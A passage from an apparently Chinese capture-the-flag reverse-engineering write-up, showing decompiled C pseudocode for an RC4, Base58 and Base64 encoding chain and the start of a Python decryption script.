</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">bin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">en1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">en2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">en3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;encodee returned NULL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>虽然直接得到了密文，但是加密过程并不能看到那几个加密函数的内容，可以在miao_encrypt函数的地方断点，动态调试，运行到该处时得到解密后的加密函数的内容，选中区域undefine后重新定义函数就可以得到可以阅读的伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">encode</span><span class="p">(</span><span class="n">CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">n</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">^=</span> <span class="nf">getbyte</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">uint8_t</span> <span class="kr">__cdecl</span> <span class="nf">getbyte</span><span class="p">(</span><span class="n">CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint8_t</span> <span class="n">t</span><span class="p">;</span> <span class="c1">// [rsp+Fh] [rbp-1h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">j</span> <span class="o">+=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="o">++</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">t</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">j</span><span class="p">])];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__cdecl</span> <span class="nf">Base64</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// al
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// al
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+34h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+3Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+3Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+3Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="p">((</span><span class="n">len</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v8</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&gt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">|=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&gt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">|=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">v11</span><span class="p">]</span> <span class="o">=</span> <span class="nf">encodee</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span><span class="o">::</span><span class="n">base64_table</span><span class="p">[(</span><span class="n">v9</span> <span class="o">&gt;&gt;</span> <span class="mi">18</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">v3</span><span class="p">]</span> <span class="o">=</span> <span class="nf">encodee</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span><span class="o">::</span><span class="n">base64_table</span><span class="p">[(</span><span class="n">v9</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="mi">61</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="nf">encodee</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span><span class="o">::</span><span class="n">base64_table</span><span class="p">[(</span><span class="n">v9</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="n">v12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span> <span class="o">=</span> <span class="n">v12</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">v5</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v6</span> <span class="o">=</span> <span class="mi">61</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="n">v6</span> <span class="o">=</span> <span class="nf">encodee</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span><span class="o">::</span><span class="n">base64_table</span><span class="p">[</span><span class="n">v9</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span> <span class="o">=</span> <span class="n">v13</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">v7</span><span class="p">]</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span><span class="p">[</span><span class="n">v11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__cdecl</span> <span class="nf">Base58</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">out</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-38h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="o">*</span><span class="n">digits</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-28h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [rsp+44h] [rbp-1Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">p</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4Ch] [rbp-14h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">carry</span><span class="p">;</span> <span class="c1">// [rsp+54h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">carrya</span><span class="p">;</span> <span class="c1">// [rsp+54h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i_0</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">zeros</span><span class="p">;</span> <span class="c1">// [rsp+5Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="mi">138</span> <span class="o">*</span> <span class="n">len</span> <span class="o">/</span> <span class="mi">100</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">digits</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="nf">calloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">zeros</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">zeros</span> <span class="o">&lt;</span> <span class="n">len</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">data</span><span class="p">[</span><span class="n">zeros</span><span class="p">];</span> <span class="o">++</span><span class="n">zeros</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i_0</span> <span class="o">=</span> <span class="n">zeros</span><span class="p">;</span> <span class="n">i_0</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i_0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">carry</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i_0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">carrya</span> <span class="o">=</span> <span class="p">(</span><span class="n">digits</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">carry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">digits</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">carrya</span> <span class="o">%</span> <span class="mi">58</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">carry</span> <span class="o">=</span> <span class="n">carrya</span> <span class="o">/</span> <span class="mi">58</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">digits</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">zeros</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">zeros</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="n">p</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">65</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">p</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="p">[</span><span class="n">v3</span><span class="p">]</span> <span class="o">=</span> <span class="n">base58_table</span><span class="p">[</span><span class="n">digits</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">out</span><span class="p">[</span><span class="n">p</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">free</span><span class="p">(</span><span class="n">digits</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>总结就是RC4+Base58+Base64</p>
<h4 id="exp-12">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BASE64_TABLE</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">BASE58_TABLE</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RC4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">S</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
